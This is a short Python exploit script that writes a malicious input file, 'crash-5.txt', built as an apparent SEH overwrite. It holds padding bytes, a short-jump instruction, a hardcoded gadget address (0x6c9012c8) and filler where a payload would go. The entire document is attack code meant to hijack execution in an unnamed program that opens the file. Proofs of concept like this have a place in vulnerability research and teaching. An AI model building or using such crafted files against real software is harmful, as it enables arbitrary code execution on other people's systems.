with open("crash-5.txt", "wb") as f:

    buf = b"\x41" * 1012
    buf += b"\xEB\x0B\x90\x90"	   #Short Jump
    buf += b"\xc8\x12\x90\x6c"     #0x6c9012c8
    buf += b"\x43" * 1988

    f.write(buf)
    f.close()
